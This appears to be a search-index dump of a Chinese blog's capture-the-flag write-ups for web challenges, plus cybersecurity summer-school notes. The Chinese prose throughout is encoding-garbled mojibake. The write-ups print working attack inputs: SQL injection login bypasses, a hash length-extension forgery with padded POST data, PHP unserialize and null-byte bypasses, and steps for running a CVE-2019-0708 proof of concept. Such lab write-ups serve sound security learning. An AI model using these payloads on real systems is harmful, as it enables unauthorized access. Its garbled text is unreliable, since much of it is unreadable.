\"å§˜æ‘å½²æå€Ÿå·é”›å±¼å®³é™îˆç¦Œé‘¹å›·ç´’\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=\u003e$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect:' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname ='{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"æµœï¹€å½²ç’§æ¶œå¢–é”›ï¿½\"; } }else{ print \"æ¶“â‚¬æ£°æ¥„ç¦Œé‘¹å›·ç´’\"; } mysql_close($con); ?\u003e å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šæ³¨å…¥å…³é”®å­—ä»¥åŠæ•°ç»„ç»•è¿‡ç­‰å§¿åŠ¿ï¼Œéšåæ ¹æ®ç”¨æˆ·è¾“å…¥çš„ uname å»æŸ¥è¯¢æ•°æ®åº“ä¸­çš„ pwdï¼Œç„¶åå’Œç”¨æˆ· POST çš„ pwd æ¯”è¾ƒï¼Œä¸€è‡´åˆ™é€šè¿‡ã€‚æ³¨æ„åˆ°è¿™é‡Œä¹Ÿæ˜¯ä¸€ä¸ªå¼±ç­‰å·ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘ç©ºå€¼ç»•è¿‡ã€‚è¿˜è¦æ³¨æ„æŸ¥è¯¢è¾“å‡ºçš„ç»“æœå¿…é¡»åªæœ‰ä¸€è¡Œã€‚ å…ˆæŸ¥çœ‹è¡¨é‡Œä¸€å…±æœ‰å‡ è¡Œæ•°æ®ï¼š 1' or 1 limit 1 offset 0# 1' or 1 limit 1 offset 1# 1' or 1 limit 1 offset 2# å‰ä¸¤æ¡éƒ½è¿”å› æµœï¹€å½²ç’§æ¶œå¢–é”›ï¿½ï¼Œè€Œç¬¬ä¸‰æ¡è¿”å› æ¶“â‚¬æ£°æ¥„ç¦Œé‘¹å›·ç´’ï¼ˆè¿™é‡Œçš„ä¹±ç æ˜¯å› ä¸ºç¼–ç é—®é¢˜ï¼Œæ‡’å¾—è½¬æ¢äº†ï¼‰ï¼Œå› æ­¤è¡¨é‡Œä¸€å…±åªæœ‰ä¸¤æ¡æ•°æ®ã€‚é‚£ä¹ˆæ€ä¹ˆæ’å…¥ä¸€æ¡æ–°çš„æ•°æ®ï¼Œä½¿å¾—å…¶ä¸­çš„ pwd ä¸º NULL å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ rollup ç»Ÿè®¡åŠŸèƒ½å®ç°ã€‚æ„é€  payloadï¼š 1' or 1 group by pwd with rollup limit 1 offset 2# æ³¨æ„è¿™é‡Œçš„é¡ºåºã€‚å…ˆ group by pwd with rollup æ’å…¥ä¸€æ¡ pwd ä¸º NULL çš„ç»Ÿè®¡æ•°æ®ï¼Œç„¶å limit 1 offset 2 å–æœ€æ–°çš„è¿™ä¸€æ¡æ•°æ®ã€‚æ­¤æ—¶ï¼Œç”±äºæˆ‘ä»¬ POST çš„ pwd ä¹Ÿæ˜¯ç©ºï¼Œå› æ­¤é€šè¿‡éªŒè¯ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:7:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"ç®€å•çš„ sql æ³¨å…¥ä¹‹ 3/2/1 ç¬¬ä¸‰é¢˜ sqlmap æŠ¥é”™æ³¨å…¥ã€‚ ç¬¬äºŒé¢˜è¿˜æ˜¯ sqlmapï¼Œä¸è¿‡ç”±äºè¿‡æ»¤ç©ºæ ¼ï¼ˆå’Œå³æ‹¬å·ï¼‰éœ€è¦ --tamper=space2commentã€‚ ä¸çŸ¥é“ä¸ºä»€ä¹ˆç¬¬ä¸€é¢˜ä¼¼ä¹å’Œç¬¬äºŒé¢˜ä¸€æ ·ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:8:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´ import requests import base64 url = 'http://ctf5.shiyanbar.com/web/10/10.php' response = requests.get(url) flag = base64.b64decode(response.headers['FLAG']).decode().split(':')[1] data = {'key': flag} res = requests.post(url=url, data=data) print(res.text) ","date":"2019-07-26","objectID":"/shiyanba-web/:9:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"è®©æˆ‘è¿›å» æŠ“åŒ…å‘ç° cookie ä¸­å­˜åœ¨ source=0ï¼Œæ”¹ä¸º 1 å³å¯æŸ¥çœ‹æºç ï¼š $flag = \"XXXXXXXXXXXXXXXXXXXXXXX\"; $secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security! $username = $_POST[\"username\"]; $password = $_POST[\"password\"]; if (!empty($_COOKIE[\"getmein\"])) { if (urldecode($username) === \"admin\" \u0026\u0026 urldecode($password) != \"admin\") { if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) { echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is\". $flag); } else { die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); } } else { die (\"You are not an admin! LEAVE.\"); } } setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\".\"admin\")), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[\"source\"])) { setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[\"source\"] != 0) { echo \"\"; // This source code is outputted here } } å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½® cookie ä¸­çš„ getmein ä¸º secret||username||password çš„ MD5 å€¼ï¼Œå…¶ä¸­ username ä¸º adminï¼Œpassword ä¸èƒ½ä¸º adminï¼Œä¸” secret æœªçŸ¥ï¼Œä½†é•¿åº¦ä¸º 15 å­—èŠ‚ã€‚ æˆ‘ä»¬è¿˜çŸ¥é“ï¼Œæ•°æ®åŒ…ä¸­çš„ sample-hash çš„å€¼å°±æ˜¯ secret||'admin'||'admin' çš„ MD5 å€¼ï¼Œè€Œè¿™ä¸ªå€¼æ˜¯å·²çŸ¥çš„ã€‚å› æ­¤ï¼Œè¿™æ˜¾ç„¶æ˜¯å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çš„æ¨¡æ¿é¢˜ã€‚å‚è€ƒ å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚å…·ä½“å‘½ä»¤ï¼š ./hash_extender --data admin --secret 20 --append append --signature 571580b26c65f306376d4f64e53cb5c7 --format md5 æ³¨æ„è¿™é‡Œ secret é•¿åº¦ä¸ºé¢˜ç›®ç»™å‡ºçš„ 15 åŠ ä¸Š admin çš„é•¿åº¦ 5ï¼Œç»“æœï¼š Type: md5 Secret length: 20 New signature: 83f2684d54049c211e191f27902caaaf New string: 61646d696e80000000000000000000000000000000000000000000000000000000000000c800000000000000617070656e64 å› æ­¤åœ¨ cookie ä¸­è®¾ç½® getmein=83f2684d54049c211e191f27902caaafï¼ŒPOST æ•°æ®ä¸ºï¼š username=admin\u0026password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00append å‘åŒ…åå¾—åˆ° flagã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:10:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"æ‹å¼¯æŠ¹è§’ ä»”ç»†è¯»å®ƒç»™çš„æ³¨é‡Šï¼Œå¯ä»¥æƒ³åˆ° index.php/index.php çš„æ–¹å¼ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:11:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"Forms æŠ“åŒ…å‘ç°å­˜åœ¨ showsource å‚æ•°ï¼Œæ”¹æˆ 1 å°±èƒ½çœ‹åˆ°æºç ï¼ŒPIN ç è¢«å†™æ­»åœ¨ä»£ç é‡Œäº†ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:12:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"å¤©ç½‘ç®¡ç†ç³»ç»Ÿ F12 çœ‹åˆ°ç™»å½•åˆ¤æ–­ä»£ç ï¼Œæ˜¯éœ€è¦ç”¨æˆ·å md5 å€¼ä¸º 0ï¼Œä»»æ„é€‰ä¸€ä¸ª md5 ä»¥ 0e å¼€å¤´çš„å­—ç¬¦ä¸²å°±ä¼šè¢«å½“ä½œæ˜¯ 0 å¤„ç†ã€‚ç™»å½•åå¾—åˆ°ä¸€ä¸ª urlï¼Œè®¿é—®å¾—åˆ°ï¼š $unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] =='???'\u0026\u0026 $data_unserialize['pass']=='???') { print_r($flag); } å¾—åˆ°å…³äº password çš„æç¤ºï¼Œè¿™é‡Œåˆ©ç”¨å¼±ç­‰äºæ¼æ´ï¼Œç›´æ¥è®© user å’Œ pass éƒ½ä¸º true å³å¯ã€‚payload: username=admin\u0026password=a:2:{s:4:\"user\";b:1;s:4:\"pass\";b:1;} ","date":"2019-07-26","objectID":"/shiyanba-web/:13:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"å¿˜è®°å¯†ç äº† éšä¾¿å¡«ä¸ªé‚®ç®±åœ°å€ï¼Œåœ¨æºä»£ç ä¸­å‘ç°è¿™æ ·ä¸¤è¡Œï¼š \u003cmeta name=\"admin\"content=\"admin@simplexue.com\"/\u003e \u003cmeta name=\"editor\"content=\"Vim\"/\u003e ç¬¬äºŒè¡Œçš„ vim ä¸€èˆ¬æŒ‡ Vim ç¼–è¾‘å™¨ï¼Œå®¹æ˜“è”æƒ³åˆ°å®ƒäº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶ .swpï¼Œå¯èƒ½åœ¨ç½‘ç«™ç›®å½•ä¸‹å­˜åœ¨è¿™ç±»æ–‡ä»¶ã€‚è€Œç¬¬ä¸€è¡Œçš„é‚®ç®±æ˜¾ç„¶å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ç®¡ç†å‘˜é‚®ç®±äº†ã€‚ æ­¤å¤–è¿˜èƒ½å¾—åˆ°æç¤ºï¼šä¸‹ä¸€æ­¥è·³è½¬åˆ° step2.phpï¼Œæ¥æ”¶ä¸€ä¸ª email å‚æ•°å’Œä¸€ä¸ª check å‚æ•°ã€‚å¦‚æœéšæ„å¡«å†™ check å‚æ•°åˆ™ä¼šæ˜¾ç¤º check error ç„¶åè¿”å› step1.phpã€‚ æŠ“åŒ…è®¿é—® step2.phpï¼ŒæŸ¥çœ‹æºç ï¼Œæ³¨æ„åˆ°å®ƒä¼šæäº¤è¯·æ±‚åˆ° submit.phpï¼Œè€Œå¦‚æœç›´æ¥è®¿é—®åˆ™ä¼šå¾—åˆ° you are not an adminã€‚å› æ­¤è€ƒè™‘è·å–ä¸‰ä¸ªé¡µé¢ä¸­æŸä¸€ä¸ªçš„æºç ï¼Œå°è¯• .step1.php.swp å’Œ .step2.php.swp æ— æœï¼Œä½†æ˜¯å­˜åœ¨ .submit.php.swpã€‚æ ¸å¿ƒä»£ç ï¼š if(!empty($token)\u0026\u0026!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r\u003e0){ echo $flag; }else{ echo \"å¤±è´¥äº†å‘€\"; } } è¿™é‡Œè¦æ±‚ token é•¿åº¦ä¸º 10 ä¸”å€¼ç­‰äº 0ï¼Œå¯ä»¥ç›´æ¥ä»¤å…¶ç­‰äº 0000000000ï¼ˆ0e ç»•è¿‡åº”è¯¥ä¹Ÿè¡Œï¼‰ã€‚æœ€ç»ˆ payloadï¼š http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com\u0026token=0000000000 ","date":"2019-07-26","objectID":"/shiyanba-web/:14:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"Once More é¦–å…ˆæ‹¿åˆ°æºä»£ç ï¼š \u003c?php if (isset ($_GET['password'])) { if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) { echo '\u003cp\u003eYou password must be alphanumeric\u003c/p\u003e'; } else if (strlen($_GET['password']) \u003c8 \u0026\u0026 $_GET['password']\u003e 9999999) { if (strpos ($_GET['password'],'*-*') !== FALSE) { die('Flag:' . $flag); } else { echo('\u003cp\u003e*-* have not been found\u003c/p\u003e'); } } else { echo '\u003cp\u003eInvalid password\u003c/p\u003e'; } } ?\u003e ä»£ç å…ˆæ£€æŸ¥ä¼ å…¥çš„å¯†ç æ˜¯å¦æ˜¯ç”±å­—æ¯å’Œæ•°å­—æ„æˆï¼Œç„¶åé™åˆ¶äº†é•¿åº¦å°äº 8 ä½†å€¼å¤§äº 9999999ï¼Œæœ€åå¯†ç ä¸­éœ€è¦å«æœ‰ *-*ã€‚ é¢˜ç›®æç¤º ereg å‡½æ•°å­˜åœ¨æ¼æ´ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯åˆ©ç”¨ %00 æˆªæ–­ï¼Œæ„é€  password=1e9%00*-* å³å¯ç»•è¿‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç›´æ¥åœ¨è¾“å…¥æ¡†è¾“å…¥ï¼Œ%00 ä¼šè¢«äºŒæ¬¡ URL ç¼–ç ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:15:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"GuessNextSession è¿™é¢˜å±äºé”™è¯¯å‡ºé¢˜çš„å…¸èŒƒï¼Œç›´æ¥ç‚¹ Guess å°±å¯ä»¥å‡ºç­”æ¡ˆã€‚ã€‚ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿˜æ˜¯å…ˆçœ‹æºç ï¼š \u003c?php session_start(); if (isset ($_GET['password'])) { if ($_GET['password'] == $_SESSION['password']) die ('Flag:'.$flag); else print '\u003cp\u003eWrong guess.\u003c/p\u003e'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?\u003e è¿™é‡Œè¦æ±‚å‚æ•° password å’Œ session ä¸­çš„ password ç›¸åŒï¼Œè€Œä¸”æ˜¯å¼±ç­‰å·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ¸…ç©º cookieï¼Œä»€ä¹ˆéƒ½ä¸å¡«ç›´æ¥æäº¤æ—¶ï¼Œå¼±ç­‰å·æ¯”è¾ƒå¿…å®šè¿”å› trueã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:16:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"FALSE æ•°ç»„ç»•è¿‡ SHA1 ç¢°æ’ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:17:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"NSCTF web200 æ ¹æ®åŠ å¯†å‡½æ•°å†™è§£å¯†å‡½æ•°ï¼Œè¿™é‡Œæ„Ÿè§‰ç”¨ PHP æ¯”ç”¨ Python è¦ç®€å•ä¸€ç‚¹ï¼š \u003c?php function decode($str) { $_o = base64_decode(strrev(str_rot13($str))); $_ = ''; for ($_0 = 0; $_0 \u003c strlen($_o); ++$_0) { $_c = substr($_o, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_ .= $_c; } return strrev($_); } echo decode('a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'); ?\u003e è¿™é‡Œçš„æŠ€å·§æ˜¯ rot13 åŠ å¯†ä¸¤æ¬¡åä¼šæ¢å¤å‡ºåŸæ¥çš„æ˜æ–‡ï¼Œæ‰€ä»¥å…¶è§£å¯†å’ŒåŠ å¯†ç”¨çš„æ˜¯åŒä¸€ä¸ªå‡½æ•°ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:18:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"ç¨‹åºé€»è¾‘é—®é¢˜ F12 å‘ç° index.txtï¼Œæ ¸å¿ƒä»£ç ï¼š \u003c?php if($_POST[user] \u0026\u0026 $_POST[pass]) { $conn = mysql_connect(\"********\", \"*****\", \"********\"); mysql_select_db(\"phpformysql\") or die(\"Could not select database\"); if ($conn-\u003econnect_error) { die(\"Connection failed:\" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) \u0026\u0026 (!strcasecmp($pass, $row[pw]))) { echo \"\u003cp\u003eLogged in! Key:************** \u003c/p\u003e\"; } else { echo(\"\u003cp\u003eLog in failure!\u003c/p\u003e\"); } } ?\u003e è¿™é‡Œä¼šå°† pass å‚æ•° MD5 åèµ‹å€¼ç»™ pass å˜é‡ï¼Œä½† username æ²¡æœ‰è¿‡æ»¤ï¼Œå­˜åœ¨æ³¨å…¥ã€‚æ„é€  payloadï¼š username=-1'union select md5(1)#\u0026password=1 ä½¿å¾— pass çš„å€¼ç»è¿‡ MD5 åä¸æŸ¥è¯¢ç»“æœç›¸åŒï¼Œå³å¯ç™»å½•ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:19:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"what a fuck! è¿™æ˜¯ä»€ä¹ˆé¬¼ä¸œè¥¿? jsfuck ç›´æ¥æ§åˆ¶å°è¿è¡Œã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:20:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"PHP å¤§æ³• æ ¹æ®æç¤ºæ‹¿åˆ°æºç ï¼š \u003c?php if(eregi(\"hackerDJ\",$_GET[id])) { echo(\"\u003cp\u003enot allowed!\u003c/p\u003e\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"\u003cp\u003eAccess granted!\u003c/p\u003e\"; echo \"\u003cp\u003eflag: *****************} \u003c/p\u003e\"; } ?\u003e äºŒæ¬¡ URL ç¼–ç ç»•è¿‡ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:21:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"è²Œä¼¼æœ‰ç‚¹éš¾ XFF å¤´ä¼ªé€  IP ä¸º 1.1.1.1ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:22:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"å¤´æœ‰ç‚¹å¤§ ä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„ User-agent å’Œ Accept-Languageï¼š User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; .NET CLR 9.9) Accept-Language: en-gb,en;q=0.9 ","date":"2019-07-26","objectID":"/shiyanba-web/:23:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"çŒ«æŠ“è€é¼  æŠ“åŒ…å‘ç°å¼‚å¸¸å­—æ®µ Content-Rowï¼Œé•¿å¾—åƒ base64 ä½†å¹¶ä¸éœ€è¦è§£ç ï¼Œç›´æ¥å¡«åœ¨ pass_key é‡Œæäº¤å°±å¥½ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:24:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"çœ‹èµ·æ¥æœ‰ç‚¹éš¾ è¿™é¢˜å¦‚æœä¸ç”¨ admin ç™»å½•ï¼Œä¼šæ˜¾ç¤ºæ•°æ®åº“è¿æ¥å¤±è´¥ï¼Œçœ‹èµ·æ¥å°±åƒé¢˜è¢«æ‰“äº†ä¸€æ ·ã€‚ æ‰€ä»¥è·‘ sqlmap ç”¨çš„ url ä¸­ï¼Œç”¨æˆ·åå¿…é¡»æ˜¯ adminï¼Œæ¯”å¦‚ http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin\u0026pass=admin\u0026action=loginã€‚å…¶å®ƒæ²¡æœ‰ä»€ä¹ˆå‘ç‚¹ã€‚ ","date":"2019-07-26","objectID":"/shiyanba-web/:25:0","tags":["Hash","SQLi","PHP","å¤å…¸å¯†ç ä¸ç¼–ç ","å¯¹ç§°å¯†ç å­¦"],"title":"å®éªŒå§ Web ç»ƒä¹ è®°å½•","uri":"/shiyanba-web/"},{"categories":["Web å®‰å…¨"],"content":"7.22-7.26ï¼Œæ”¶è·ä¸å¤§ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:0:0","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Day1 \u0026 Day2 æ¦‚å¿µä»‹ç»å’Œæ¯”è¾ƒåŸºæœ¬çš„æ¼æ´åˆ©ç”¨ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:1:0","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"å¯èƒ½éœ€è¦è¡¥çš„ä¸œè¥¿ åè®® \u0026 è·¯ç”±ç›¸å…³çŸ¥è¯†ï¼šTCP/IP å·ä¸€ï¼ŒCCNA/CCNP å­¦ä¹ æŒ‡å¯¼ å®‰å…¨æŠ€èƒ½è¯ä¹¦ PHP ä»£ç å®¡è®¡å·¥å…· PHP SQL å·¥å…·çš„ä½¿ç”¨ â€¦â€¦ ","date":"2019-07-23","objectID":"/summer-school/:1:1","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"CVE-2019-0708 è·å–è„šæœ¬ï¼šhttps://www.exploit-db.com/exploits/46946ï¼Œå‘½åä¸º poc.pyã€‚ åœ¨ Win7 é¶æœºä¸Šå¼€å¯ 3389 ç«¯å£ï¼ˆè®¡ç®—æœº-\u003eå±æ€§-\u003eè¿œç¨‹è®¾ç½®-\u003eå…è®¸æ‰€æœ‰...ï¼‰ï¼Œå¹¶é€šè¿‡ ipconfig æŸ¥çœ‹ IPã€‚ æœ€åç»ˆç«¯è¿è¡Œï¼š $ python poc.py [é¶æœº IP é¶æœºä½æ•°] å…¶ä¸­é¶æœº IP ä¸ºä¸Šé¢è·å¾—çš„ IPï¼Œé¶æœºä½æ•°ä¸º 32 æˆ– 64ã€‚ å…¶ä½™ CVE åˆ©ç”¨è¿‡ç¨‹éƒ½åŸºäº MSFï¼Œæ¯”è¾ƒå¥—è·¯ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:1:2","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Day3 Web æ–¹å‘ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:0","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level4 æ‰«åå°å‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶ index.php.bakï¼Œå¾— PHP ä»£ç ï¼š \u003c?php ERROR_REPORTING(0); if(!empty($_GET['ver'])==PHP_VERSION){ if($_GET['ver']==PHP_VERSION){ $key = \"**********\"; } } ?\u003e burp æŠ“åŒ…å‘ç°è¿”å›å¤´ä¸­æœ‰ X-Powered-By: PHP/5.4.41ï¼Œé‚£ä¹ˆæŠŠ ver=5.4.41 ä½œä¸ºå‚æ•°é€šè¿‡ GET è¯·æ±‚å‘é€å³å¯ã€‚ ","date":"2019-07-23","objectID":"/summer-school/:2:1","tags":["Kali","Hash","Javascript","ååºåˆ—åŒ–","RSA","SQLi"],"title":"ECNU X å¯æ˜æ˜Ÿè¾° ç½‘ç»œå®‰å…¨æš‘æœŸå­¦æ ¡è®°å½•","uri":"/summer-school/"},{"categories":["Web å®‰å…¨"],"content":"Level5 F12 åœ¨æ³¨é‡Šä¸­å‘ç°å­˜åœ¨ password.txtï¼ŒæŸ¥çœ‹å‘ç°æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæ”¾åˆ° Intruder é‡Œè·‘å‡ºå¯†ç ä¸º Nsf0cuSï¼Œç„¶åç™»å½•ã€‚ä¸è¿‡å‰ç«¯æœ‰ js é™åˆ¶äº†å¯†ç é•¿åº¦ï¼Œä¿®æ”¹ js å³å¯ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ Burp å‘åŒ…ã€‚ ç™»é™†æˆåŠŸåï¼Œåœ¨ Set-Cookie å­—æ®µä¸­å‘ç° newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;ï¼Œbase64 è§£ç å¾— 290bca70c7dae93db6644fa00b9d83b9.phpï¼Œè®¿é—®ã€‚ 